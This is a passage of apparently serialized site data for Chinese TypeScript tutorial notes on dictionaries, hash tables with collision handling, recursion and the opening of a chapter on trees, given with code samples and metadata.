{\n    if (key == null) { // 参数不合法\n        return false;\n    }\n    const tableKey: number = this.hashCode(key);\n    if (this._table[tableKey] == null) { // 因为是线性，这个为空证明下面的也没有，直接返回fasle\n        return false;\n    }\n    // key相同，并且没被删除 {1}\n    if (this._table[tableKey].key === key && !this._table[tableKey].isDeleted) {\n        this._table[tableKey].isDeleted = true;\n        return true;\n    } else {\n        let index: number = tableKey + 1;\n        while (this._table[index] != null && (this._table[index].key !== key\n            || this._table[index].isDeleted)) {\n            // 情况1：key相同并且被删除。是我们找的key，但被删除了那就直接return false {2}\n            if (this._table[index].key === key && this._table[index].isDeleted) {\n                return false;\n            }\n            index ++; // 情况2：key不相同，删不删除无所谓。此时必须找下一个位置以保证拿到相同key {3}\n        }\n        // 情况3：key相同并且没被删除 {4}\n        if (this._table[index] != null) {\n            this._table[index].isDeleted = true;\n            return true;\n        }\n        return false; // this._table[index]为空, 没有删除的东西\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n    5.其他方法getTable、size、isEmpty、clear、toString也不作说明了，很简单。\n\n\n# 真删除式的线性探查法\n\n    软删除只是用字段记录了删除状态，不会将元素移除，如果数据够多，查询起来效率很慢。真删除，是真正的将那个元素移除，并且将下面的元素补上来。\n\n    软删除式的线性探查法实现代码细节：hash-table-linear-probing.ts\n\n    1.put方法同软删除的很像，少了isDeleted的判断而已。先通过散列函数拿到对应的散列值，然后通过对象的[]拿到对应位置的值；判断这个值是否不存在，如果不存在可以将新元素存在这里，如果存在，我们让散列值的值+1，再看这个位置的有没有人占，有的话散列值再+1，直到找到空位置才赋值。\n\n    2.get方法，先通过散列函数拿到对应的散列值，然后通过对象的[]拿到对应位置的值；判断这个值是否存在并且key相同，如果满足条件就返回这个值，否则，我们让散列值的值+1，再看新位置的值存不存在并且key相同，如果不行再让散列值再+1，直到找到的位置上的值存在并且key相同。\n\n    3.remove方法，最麻烦的是这个方法了，它在get逻辑基础上增加了delte和verifyRemoveSideEffect方法。我们get到一个元素，先删除它，然后需要把下面的元素补上去。补上去的时候它把遍历到当前位置的散列值与空缺位置的散列值相比较，如果小，会把当前位置的元素补到空缺位置。而不符合这个条件的只是单纯的往上移一个位置。\n\n/**\n * 如果HashTable后面有小于等于被删除key的hash值，先将这移到空缺处，\n * 然后继续向后遍历，当前位置的hash值小于等于空缺处的hash值，就将这移到空缺处，\n * 总之就是在遍历一遍的情况下尽可能的保证hash值有序，可能会存在个别无序或者还有空缺的地方\n * @param key 键\n * @param removedPosition 删除时的位置的散列值（hash值）\n */\nprivate verifyRemoveSideEffect(key: K, removedPosition: number) {\n    const hash = this.hashCode(key);\n    let index = removedPosition + 1;\n    while (this._table[index] != null) {\n        const posHash = this.hashCode(this._table[index].key);\n        if (posHash <= hash || posHash <= removedPosition) {\n            this._table[removedPosition] = this._table[index];\n            delete this._table[index];\n            removedPosition = index;\n        }\n        index++;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n    4.其他方法getTable、size、isEmpty、clear、toString也不作说明了，很简单。\n\n\n# 更好的散列函数\n\n    lose lose散列函数并不是一个表现良好的散列函数，它会产生太多冲突。一个表现良好的散列函数由几个方面构成：插入和检索元素的事件（即性能），以及较低的冲突可能性。\n\nprivate djb2HashCode(key: K) {\n    const tableKey = this._toStrFn(key);\n    let hash = 5381; // 大多实现用的5381\n    for (let i = 0; i < tableKey.length; i ++) {\n        // 与一个常数相乘\n        hash = (hash * 33) + tableKey.charCodeAt(i);\n    }\n    return hash % 1013; // 随机质数1013\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n    这并不最好的散列函数，但是最受社区推崇的散列函数之一。\n\n\n# WeakMap和WeakSet\n\n    前面有介绍过，es2015已经有自己的Set和Map了，我们建议使用es2015的而不是使用自己实现的Set和Map。es2015还给我们准备了它们的弱化版本WeakSet和WeakMap。\n\n    与Set和Map相比，WeakSet和WeakMap没有entries、keys和values等方法，然后就是只能用对象作为键（WeakSet就是只能对象作为元素）。WeakSet和WeakMap的键是弱引用，也就是说当程序不再拥有这个对象的引用时，垃圾回收器就可以从WeakSet或WeakMap中回收这些对象。",normalizedContent:"# 字典和散列表\n\n\n# 字典数据结构\n\n    字典(dictionary)是一个以[键, 值]形式来存储唯一值的数据结构。     集合是以[值, 值]形式存储的，这是两者的区别；字典也称作映射、符号表或关联数组；null和undefined不可以用作键或值。\n\n\n# 字典实现\n\n    其实在es2015，新增了map类作为javascript api的一部分，所以我们可以直接使用它（跟array一样可以不用自己实现，但在这里还是实现一下map，开发过程中直接使用es2015的map）。\n\n    字典实现代码细节：dictionary.ts\n\n    1.先准备一个助手类valuepair，作为字典的[键, 值]中的“值”。它含有两个公有属性value和key，还有一个重写的tostring方法。\n\n    2.给字典类声明一个私有属性_table，它的类型当然是[键, 值]这样的形式。先选用对象类型，然后对象的属性名和属性值的存储形式必须是k:v，k这里一般就是选择string，而v当然就选择我们之前创建的valuepair。具体如下\n\nprivate _table: { [k: string]: valuepair<k, v> };\n\n\n1\n\n\n    3.再声明一个_tostrfn，用以接收实例化时外界传来的“any转字符串”方法，意思是“键”的类型我们需要统一转换成string，这样方便作为对象的属性名。\n\n    4.set方法，向字典中添加新元素。将key用_tostrfn的方法转换成string类型，然后以key作为_table的属性名、new valuepair(key, value)作为_table的属性值形成一个[键, 值]形式的元素（重复的也会被覆盖）。\n\n    5.get方法，通过以键作为参数查找对应的值并返回。将key用_tostrfn的方法转换成string类型，然后用对象的[]来直接查找key对应的valuepair，最后返回valuepair.value即可。\n\n    6.haskey方法，如果某个键值存在于该字典中返回true，否则返回false。这个很简单，直接调用get方法，然后判断get的结果是否为空。\n\n    7.remove方法，通过键来删除字典中对应的键值对。先调用haskey方法判断这个key是否存在于字典中，存在的话使用delete操作符去删除_table对象中对应的属性名key。\n\n    8.keyvalues方法，将字典中所有[键, 值]对返回。直接object.values(this._table)就能得到。\n\n    9.values方法，将字典所包含的所有数值以数组形式返回。先调用keyvalues，得到字典中所有[键, 值]对，然后配合map方法得出字典的所有数值。\n\n    10.keys方法，将字典所包含的所有键名以数组的形式返回。先调用keyvalues，得到字典中所有[键, 值]对，然后配合map方法得出字典的所有键名。\n\n    11.foreach方法，迭代字典中所有的键值对（只要有一项不符合callbackfn就中断迭代）\n\npublic foreach(callbackfn: (key: k, value: v) => any) {\n    const valuepair = this.keyvalues();\n    for (let i = 0, le = valuepair.length; i < le; i ++) {\n        const result = callbackfn(valuepair[i].key, valuepair[i].value);\n        if (result === false) {\n            break;\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n    11.其他方法size、isempty、clear、tostring跟以往一样比较好实现。\n\n\n# 散列表数据结构\n\n    字典(hashtable或hashmap)是字典的散列表实现。\n\n    散列表使用了散列算法，散列算法的作用是尽可能快地在数据结构中找到一个值，它不像其他的方法要迭代整个数据结构。\n\n    散列表的应用有很多，例如关系型数据库中的表索引、javascript对象内部的实现（对象的每个属性和方法（成员）被储存为key对象类型，每个key指向对应的对象成员）。\n\n\n# 散列表实现\n\n    散列表实现代码细节：hash-table.ts\n\n    1.散列表的跟字典一样，同样声明了_table和_tostrfn，可以查看字典那一节回顾一下。\n\n    2.创建散列函数，采用的是lose lose散列函数，就是将键值中的每个字母的ascii值相加。\n\nprivate loselosehashcode(key: k): number {\n    if (typeof key === 'number') {\n        return key;\n    }\n    const tablekey = this._tostrfn(key);\n    let hash = 0;\n    for (let i = 0, le = tablekey.length; i < le; i ++) {\n        hash += tablekey.charcodeat(i);\n    }\n    return hash % 37;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n    你可能对“% 37”这个处理感到不解，它主要是为了避免散列值超过number的最大值，将散列表约束在一个小的范围内。但是有新问题，这表里不就只能有37个元素了？下面一节会解决这个问题。\n\n    3.put、get、remove跟字典的里同名方法实现没什么区别，只是它的key多了一次散列处理。其他方法gettable、size、isempty、clear、tostring也不作说明了，很简单。\n\n\n# 解决散列表的冲突\n\n    上面我们提到过，再“% 37”后，最终存下来的元素只有37个了，其他很多元素都会在相同的散列值那里被覆盖掉，我们解决的这个问题的方法有三种：分离链接法、线性探查法和双散列法。这里只说前两种。\n\n\n# 分离链接法\n\n    分离链接法就是为散列表的每一个位置创建链表，将相同散列值存储在各自的链表中以解决冲突。\n    这种方法虽然是最简单的处理冲突的方法，但是比较耗存储空间如果每个位置都用链表。\n\n    散列表分离链接法实现代码细节：hash-table-separate-chaining.ts\n\n    1.put方法，先通过散列函数拿到对应的散列值，然后通过对象的[]拿到对应位置的链表，如果这个链表为null就新创建一个链表赋给这个对象；我们将新元素通过链表的put方法添加到链表里，这样就完成了散列表新增元素的方法。\n\n    2.get方法，先通过散列函数拿到对应的散列值，然后通过对象的[]拿到对应位置的链表，如果链表为null或者链表中没有元素，就直接返回undefined；如果链表存在并且有元素，那么去遍历链表（从head开始通过next来遍历）只要key与元素存的key一样，证明这个元素就是我们要get的元素。\n\n    3.remove方法，原理同get方法类似，找到对应位置链表，遍历链表找到相同key的元素，使用链表的remove方法删除这个元素；在删除这个元素我们还需要做的一件事就是判断这个链表是否为空了，为空了就将链表从_table中delete掉。\n\n    4.其他方法gettable、size、isempty、clear、tostring也不作说明了，很简单。\n\n\n# 软删除式的线性探查法\n\n    线性探查法将每个元素都存储在表中，而不是借助链表等外物来解决冲突。\n\n    当想向表中某个位置添加一个新元素的时候，如果索引为index的位置已经被占据了，就尝试index+1的位置，如果这个位置也被占据就尝试下一个直至找到空闲的位置。\n    它有个问题：删除时会用一个字段记录删除状态而不是真正的删除它，在查询时可能会查询很多位置的这个字段导致效率变慢。\n\n    软删除式的线性探查法实现代码细节：hash-table-linear-probing-lazy.ts\n\n    1.因为是用一个字段记录删除的状态，所以我们新建一个助手类valuepairlazy，它比valuepair多一个isdeleted字段，代表是否被删除了。\n\n    2.put方法，先通过散列函数拿到对应的散列值，然后通过对象的[]拿到对应位置的值；判断这个值是否不存在或者它存在的话isdeleted为true，意思是这个位置没有人占，可以将这个位置直接拿下把新元素存在这里；否则，我们让散列值的值+1，再看这个位置的有没有人占，有的话散列值再+1，直到找到空位置才赋值。\n\n    3.get方法\n\n/**\n * 通过以键值作为参数查找对应的值并返回\n * 情况复杂：\n * 1.哈希值所在的位置key相同并且没被删除就返回这个value，否则去下一个位置查找。 {1}\n * 2.下一个位置key相同并且也没被删除就返回这个value。否则只能去寻下下个位置了。{4}\n * 3.但是下一个位置key相同并且被删除就直接return undefined {2}\n * 4.一直找但key一直不相同（删不删除无所谓），就一直找，直到没有元素了（this._table[index]为空） {3}\n */\npublic get(key: k): v {\n    if (key == null) { // 参数不合法\n        return undefined;\n    }\n    const tablekey: number = this.hashcode(key);\n    if (this._table[tablekey] == null) { // 因为是线性，这个为空证明下面的也没有，直接返回undefined\n        return undefined;\n    }\n    // key相同，并且没被删除 {1}\n    if (this._table[tablekey].key === key && !this._table[tablekey].isdeleted) {\n        return this._table[tablekey].value;\n    } else {\n        let index: number = tablekey + 1;\n        while (this._table[index] != null && (this._table[index].key !== key\n            || this._table[index].isdeleted)) {\n            // 情况1：key相同并且被删除。是我们找的key，但被删除了那就直接return undefined {2}\n            if (this._table[index].key === key && this._table[index].isdeleted) {\n                return undefined;\n            }\n            index ++; // 情况2：key不相同，删不删除无所谓。此时必须找下一个位置以保证拿到相同key {3}\n        }\n        // 情况3：key相同并且没被删除或者this._table[index]根本就为空 {4}\n        return this._table[index] != null ? this._table[index].value : undefined;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n    4.remove方法\n\n/**\n * 通过键来删除字典中对应的键值对\n * 情况复杂：\n * 1.哈希值所在的位置key相同并且没被删除就返回这个value，否则去下一个位置查找。 {1}\n * 2.下一个位置key相同并且也没被删除就返回这个value。否则只能去寻下下个位置了。{4}\n * 3.但是下一个位置key相同并且被删除就直接return undefined {2}\n * 4.一直找但key一直不相同（删不删除无所谓），就一直找，直到没有元素了（this._table[index]为空） {3}\n */\npublic remove(key: k): boolean {\n    if (key == null) { // 参数不合法\n        return false;\n    }\n    const tablekey: number = this.hashcode(key);\n    if (this._table[tablekey] == null) { // 因为是线性，这个为空证明下面的也没有，直接返回fasle\n        return false;\n    }\n    // key相同，并且没被删除 {1}\n    if (this._table[tablekey].key === key && !this._table[tablekey].isdeleted) {\n        this._table[tablekey].isdeleted = true;\n        return true;\n    } else {\n        let index: number = tablekey + 1;\n        while (this._table[index] != null && (this._table[index].key !== key\n            || this._table[index].isdeleted)) {\n            // 情况1：key相同并且被删除。是我们找的key，但被删除了那就直接return false {2}\n            if (this._table[index].key === key && this._table[index].isdeleted) {\n                return false;\n            }\n            index ++; // 情况2：key不相同，删不删除无所谓。此时必须找下一个位置以保证拿到相同key {3}\n        }\n        // 情况3：key相同并且没被删除 {4}\n        if (this._table[index] != null) {\n            this._table[index].isdeleted = true;\n            return true;\n        }\n        return false; // this._table[index]为空, 没有删除的东西\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n    5.其他方法gettable、size、isempty、clear、tostring也不作说明了，很简单。\n\n\n# 真删除式的线性探查法\n\n    软删除只是用字段记录了删除状态，不会将元素移除，如果数据够多，查询起来效率很慢。真删除，是真正的将那个元素移除，并且将下面的元素补上来。\n\n    软删除式的线性探查法实现代码细节：hash-table-linear-probing.ts\n\n    1.put方法同软删除的很像，少了isdeleted的判断而已。先通过散列函数拿到对应的散列值，然后通过对象的[]拿到对应位置的值；判断这个值是否不存在，如果不存在可以将新元素存在这里，如果存在，我们让散列值的值+1，再看这个位置的有没有人占，有的话散列值再+1，直到找到空位置才赋值。\n\n    2.get方法，先通过散列函数拿到对应的散列值，然后通过对象的[]拿到对应位置的值；判断这个值是否存在并且key相同，如果满足条件就返回这个值，否则，我们让散列值的值+1，再看新位置的值存不存在并且key相同，如果不行再让散列值再+1，直到找到的位置上的值存在并且key相同。\n\n    3.remove方法，最麻烦的是这个方法了，它在get逻辑基础上增加了delte和verifyremovesideeffect方法。我们get到一个元素，先删除它，然后需要把下面的元素补上去。补上去的时候它把遍历到当前位置的散列值与空缺位置的散列值相比较，如果小，会把当前位置的元素补到空缺位置。而不符合这个条件的只是单纯的往上移一个位置。\n\n/**\n * 如果hashtable后面有小于等于被删除key的hash值，先将这移到空缺处，\n * 然后继续向后遍历，当前位置的hash值小于等于空缺处的hash值，就将这移到空缺处，\n * 总之就是在遍历一遍的情况下尽可能的保证hash值有序，可能会存在个别无序或者还有空缺的地方\n * @param key 键\n * @param removedposition 删除时的位置的散列值（hash值）\n */\nprivate verifyremovesideeffect(key: k, removedposition: number) {\n    const hash = this.hashcode(key);\n    let index = removedposition + 1;\n    while (this._table[index] != null) {\n        const poshash = this.hashcode(this._table[index].key);\n        if (poshash <= hash || poshash <= removedposition) {\n            this._table[removedposition] = this._table[index];\n            delete this._table[index];\n            removedposition = index;\n        }\n        index++;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n    4.其他方法gettable、size、isempty、clear、tostring也不作说明了，很简单。\n\n\n# 更好的散列函数\n\n    lose lose散列函数并不是一个表现良好的散列函数，它会产生太多冲突。一个表现良好的散列函数由几个方面构成：插入和检索元素的事件（即性能），以及较低的冲突可能性。\n\nprivate djb2hashcode(key: k) {\n    const tablekey = this._tostrfn(key);\n    let hash = 5381; // 大多实现用的5381\n    for (let i = 0; i < tablekey.length; i ++) {\n        // 与一个常数相乘\n        hash = (hash * 33) + tablekey.charcodeat(i);\n    }\n    return hash % 1013; // 随机质数1013\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n    这并不最好的散列函数，但是最受社区推崇的散列函数之一。\n\n\n# weakmap和weakset\n\n    前面有介绍过，es2015已经有自己的set和map了，我们建议使用es2015的而不是使用自己实现的set和map。es2015还给我们准备了它们的弱化版本weakset和weakmap。\n\n    与set和map相比，weakset和weakmap没有entries、keys和values等方法，然后就是只能用对象作为键（weakset就是只能对象作为元素）。weakset和weakmap的键是弱引用，也就是说当程序不再拥有这个对象的引用时，垃圾回收器就可以从weakset或weakmap中回收这些对象。",charsets:{cjk:!0}},{title:"7.递归",frontmatter:{title:"7.递归"},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/7.%E9%80%92%E5%BD%92.html",relativePath:"book-web/数据结构与算法/7.递归.md",key:"v-22e1c1e0",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/7.%E9%80%92%E5%BD%92.html",headers:[{level:2,title:"理解递归",slug:"理解递归",normalizedTitle:"理解递归",charIndex:9},{level:2,title:"计算一个数的阶乘",slug:"计算一个数的阶乘",normalizedTitle:"计算一个数的阶乘",charIndex:362},{level:3,title:"迭代阶乘",slug:"迭代阶乘",normalizedTitle:"迭代阶乘",charIndex:404},{level:3,title:"递归阶乘",slug:"递归阶乘",normalizedTitle:"递归阶乘",charIndex:678},{level:2,title:"斐波那契数列",slug:"斐波那契数列",normalizedTitle:"斐波那契数列",charIndex:922},{level:3,title:"迭代求斐波那契数列",slug:"迭代求斐波那契数列",normalizedTitle:"迭代求斐波那契数列",charIndex:1174},{level:3,title:"递归求斐波那契数列",slug:"递归求斐波那契数列",normalizedTitle:"递归求斐波那契数列",charIndex:1608},{level:3,title:"记忆化求斐波那契数列",slug:"记忆化求斐波那契数列",normalizedTitle:"记忆化求斐波那契数列",charIndex:1873},{level:2,title:"尾调用优化",slug:"尾调用优化",normalizedTitle:"尾调用优化",charIndex:1659}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"理解递归 计算一个数的阶乘 迭代阶乘 递归阶乘 斐波那契数列 迭代求斐波那契数列 递归求斐波那契数列 记忆化求斐波那契数列 尾调用优化",content:"# 递归\n\n\n# 理解递归\n\n>     递归是一个过程或函数在其定义或说明中有直接或间接调用自身的一种方法。简单来说就是程序调用自身。它通常把一个大型复杂的问题层层转化为一个与原问题相似的规模较小的问题来求解，递归策略只需少量的程序就可描述出解题过程所需要的多次重复计算，大大地减少了程序的代码量。     构成递归需要两个条件：1.子问题须与原始问题为同样的事，且更为简单；2.不能无限制地调用本身，须有个出口（边界条件），化简为非递归状况处理。     递归算法解题相对常用的算法如普通循环等，运行效率较低。因此，应该尽量避免使用递归，除非没有更好的算法或者某种特定情况，递归更为适合的时候。在递归调用的过程当中系统为每一层的返回点、局部量等开辟了栈来存储。递归次数过多容易造成栈溢出等。——百度百科“递归”\n\n\n# 计算一个数的阶乘\n\n> 数n的阶乘，定义为n!，表示从1到n的整数的乘积。\n\n\n# 迭代阶乘\n\n/**\n * 迭代方法求阶乘\n */\nexport function factorialIterative(number: number) {\n    if (number < 0) {\n        return undefined;\n    }\n    let total = 1;\n    for (let n = number; n > 1; n --) {\n        total *= n;\n    }\n    return total;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 递归阶乘\n\n/**\n * 递归方法求阶乘\n */\nexport function factorial(n: number): number {\n    if (n < 0) {\n        return undefined;\n    }\n    if (n === 1 || n === 0) {\n        return 1;\n    }\n    return n * factorial(n - 1);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 斐波那契数列\n\n    斐波那契数列又称黄金分割数列，指的是这样的数列：1、1、2、3、5、8、13、21、34...，从第3项开始，每一项都等于前两项之和。\n\n    与黄金分割的关系，当n趋向于无穷大时，前一项与后一项的比值越来越逼近黄金分割0.618（或者说后一项与前一项的比值小数部分越来越逼近 0.618）。\n\n    斐波那契数列有一些特性，1.当前项的平方与前后项的乘积总是相差1，正负性跟n有关。2.第一项到第n项，每项的平方相加等于第n项和第n+1项的乘积。类似特性还有很多。\n\n\n# 迭代求斐波那契数列\n\n/**\n * 迭代求斐波拉契数，迭代方法会比递归方法快，但代码多\n */\nexport function fibonacciIterative(n: number) {\n    if (n < 1) { return 0; }\n    let fibNMinus2 = 0;\n    let fibNMinus1 = 1;\n    let fibN = n;\n    for (let i = 2; i <= n; i++) {\n        // n >= 2\n        fibN = fibNMinus1 + fibNMinus2; // f(n-1) + f(n-2)\n        fibNMinus2 = fibNMinus1;\n        fibNMinus1 = fibN;\n    }\n    return fibN;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 递归求斐波那契数列\n\n/**\n * 递归求斐波拉契数，代码少容易理解，但运行慢耗内存\n * 但es6有尾调用优化能大部分解决消耗问题，可以经常使用递归解决问题\n */\nexport function fibonacci(n: number): number {\n    if (n < 1) { return 0; }\n    if (n <= 2) { return 1; }\n    return fibonacci(n - 1) + fibonacci(n - 2);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 记忆化求斐波那契数列\n\n/**\n * 迭代求斐波拉契数（记忆化，用数组缓存结果），运行较快（但还是比迭代慢）\n */\nexport function fibonacciMemoization(n: number) {\n    if (n < 1) { return 0; }\n    const memo = [0, 1];\n    const fibonacciMem = (num: number): number => {\n        if (memo[num] != null) { return memo[num]; }\n        return (memo[num] = fibonacciMem(num - 1) + fibonacciMem(num - 2));\n    };\n    return fibonacciMem(n);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 尾调用优化\n\n    es2015有尾调用优化(tail call optimization)，函数内的最后一步操作是调用函数，会通过“跳转命令”而不是“子程序调用”。\n\n    我们把递归改写成尾调用形式，再根据浏览器的要求（有些需要严格模式）就可以完美使用递归了，这样就可以避免栈溢出，相对节省内存。",normalizedContent:"# 递归\n\n\n# 理解递归\n\n>     递归是一个过程或函数在其定义或说明中有直接或间接调用自身的一种方法。简单来说就是程序调用自身。它通常把一个大型复杂的问题层层转化为一个与原问题相似的规模较小的问题来求解，递归策略只需少量的程序就可描述出解题过程所需要的多次重复计算，大大地减少了程序的代码量。     构成递归需要两个条件：1.子问题须与原始问题为同样的事，且更为简单；2.不能无限制地调用本身，须有个出口（边界条件），化简为非递归状况处理。     递归算法解题相对常用的算法如普通循环等，运行效率较低。因此，应该尽量避免使用递归，除非没有更好的算法或者某种特定情况，递归更为适合的时候。在递归调用的过程当中系统为每一层的返回点、局部量等开辟了栈来存储。递归次数过多容易造成栈溢出等。——百度百科“递归”\n\n\n# 计算一个数的阶乘\n\n> 数n的阶乘，定义为n!，表示从1到n的整数的乘积。\n\n\n# 迭代阶乘\n\n/**\n * 迭代方法求阶乘\n */\nexport function factorialiterative(number: number) {\n    if (number < 0) {\n        return undefined;\n    }\n    let total = 1;\n    for (let n = number; n > 1; n --) {\n        total *= n;\n    }\n    return total;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 递归阶乘\n\n/**\n * 递归方法求阶乘\n */\nexport function factorial(n: number): number {\n    if (n < 0) {\n        return undefined;\n    }\n    if (n === 1 || n === 0) {\n        return 1;\n    }\n    return n * factorial(n - 1);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 斐波那契数列\n\n    斐波那契数列又称黄金分割数列，指的是这样的数列：1、1、2、3、5、8、13、21、34...，从第3项开始，每一项都等于前两项之和。\n\n    与黄金分割的关系，当n趋向于无穷大时，前一项与后一项的比值越来越逼近黄金分割0.618（或者说后一项与前一项的比值小数部分越来越逼近 0.618）。\n\n    斐波那契数列有一些特性，1.当前项的平方与前后项的乘积总是相差1，正负性跟n有关。2.第一项到第n项，每项的平方相加等于第n项和第n+1项的乘积。类似特性还有很多。\n\n\n# 迭代求斐波那契数列\n\n/**\n * 迭代求斐波拉契数，迭代方法会比递归方法快，但代码多\n */\nexport function fibonacciiterative(n: number) {\n    if (n < 1) { return 0; }\n    let fibnminus2 = 0;\n    let fibnminus1 = 1;\n    let fibn = n;\n    for (let i = 2; i <= n; i++) {\n        // n >= 2\n        fibn = fibnminus1 + fibnminus2; // f(n-1) + f(n-2)\n        fibnminus2 = fibnminus1;\n        fibnminus1 = fibn;\n    }\n    return fibn;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 递归求斐波那契数列\n\n/**\n * 递归求斐波拉契数，代码少容易理解，但运行慢耗内存\n * 但es6有尾调用优化能大部分解决消耗问题，可以经常使用递归解决问题\n */\nexport function fibonacci(n: number): number {\n    if (n < 1) { return 0; }\n    if (n <= 2) { return 1; }\n    return fibonacci(n - 1) + fibonacci(n - 2);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 记忆化求斐波那契数列\n\n/**\n * 迭代求斐波拉契数（记忆化，用数组缓存结果），运行较快（但还是比迭代慢）\n */\nexport function fibonaccimemoization(n: number) {\n    if (n < 1) { return 0; }\n    const memo = [0, 1];\n    const fibonaccimem = (num: number): number => {\n        if (memo[num] != null) { return memo[num]; }\n        return (memo[num] = fibonaccimem(num - 1) + fibonaccimem(num - 2));\n    };\n    return fibonaccimem(n);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 尾调用优化\n\n    es2015有尾调用优化(tail call optimization)，函数内的最后一步操作是调用函数，会通过“跳转命令”而不是“子程序调用”。\n\n    我们把递归改写成尾调用形式，再根据浏览器的要求（有些需要严格模式）就可以完美使用递归了，这样就可以避免栈溢出，相对节省内存。",charsets:{cjk:!0}},{title:"8.树",frontmatter:{title:"8.树"},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/8.%E6%A0%91.html",relativePath:"book-web/数据结构与算法/8.树.md",key:"v-4ef80a54",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/8.%E6%A0%91.html",headers:[{level:2,title:"树数据结构",slug:"树数据结构",normalizedTitle:"树数据结构",charIndex:8},{level:2,title:"二叉树",slug:"二叉树",normalizedTitle:"二叉树",charIndex:292},{level:2,title:"二叉搜索树的实现",slug:"二叉搜索树的实现",normalizedTitle:"二叉搜索树的实现",charIndex:650},{level:3,title:"实现二叉搜索树的准备工作",slug:"实现二叉搜索树的准备工作",normalizedTitle:"实现二叉搜索树的准备工作",charIndex:703},{level:3,title:"二叉搜索树的插入元素",slug:"二叉搜索树的插入元素",normalizedTitle:"二叉搜索树的插入元素",charIndex:874},{level:3,title:"二叉搜索树的遍历",slug:"二叉搜索树的遍历",normalizedTitle:"二叉搜索树的遍历",charIndex:1864},{level:3,title:"二叉搜索树的最大值和最小值",slug:"二叉搜索树的最大值和最小值",normalizedTitle:"二叉搜索树的最大值和最小值",charIndex:3398},{level:3,title:"二叉搜索树的查找元素",slug:"二叉搜索树的查找元素",normalizedTitle:"二叉搜索树的查找元素",charIndex:4221},{level:3,title:"二叉搜索树的移除元素",slug:"二叉搜索树的移除元素",normalizedTitle:"二叉搜索树的移除元素",charIndex:5026},{level:2,title:"平衡二叉树的实现",slug:"平衡二叉树的实现",normalizedTitle:"平衡二叉树的实现",charIndex:7245},{level:3,title:"节点的高度和平衡因子",slug:"节点的高度和平衡因子",normalizedTitle:"节点的高度和平衡因子",charIndex:7288},{level:3,title:"平衡二叉树的平衡操作",slug:"平衡二叉树的平衡操作",normalizedTitle:"平衡二叉树的平衡操作",charIndex:8477},{level:3,title:"自平衡树的插入节点",slug:"自平衡树的插入节点",normalizedTitle:"自平衡树的插入节点",charIndex:13392},{level:3,title:"自平衡树的移除节点",slug:"自平衡树的移除节点",normalizedTitle:"自平衡树的移除节点",charIndex:14976},{level:2,title:"红黑树的实现",slug:"红黑树的实现",normalizedTitle:"红黑树的实现",charIndex:16712},{level:3,title:"红黑树的插入节点",slug:"红黑树的插入节点",normalizedTitle:"红黑树的插入节点",charIndex:17028},{level:3,title:"红黑树的移除节点",slug:"红黑树的移除节点",normalizedTitle:"红黑树的移除节点",charIndex:18155}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"树数据结构 二叉树 二叉搜索树的实现 实现二叉搜索树的准备工作 二叉搜索树的插入元素 二叉搜索树的遍历 二叉搜索树的最大值和最小值 二叉搜索树的查找元素 二叉搜索树的移除元素 平衡二叉树的实现 节点的高度和平衡因子 平衡二叉树的平衡操作 自平衡树的插入节点 自平衡树的移除节点 红黑树的实现 红黑树的插入节点 红黑树的移除节点",content:"# 树\n\n\n# 树数据结构\n\n    树(Tree)是一种分层数据的抽象模型。一个树结构包含一系列存在父子关系的节点，每个节点都有一个父子节点（除了树顶部的根节点）以及零个或多个子节点。\n\n    树中的每个元素都叫作节点，节点分为内部节点和外部节点。至少有一个子节点的节点称为内部节点，没有子节点的节点称为外部节点或叶节点。\n\n    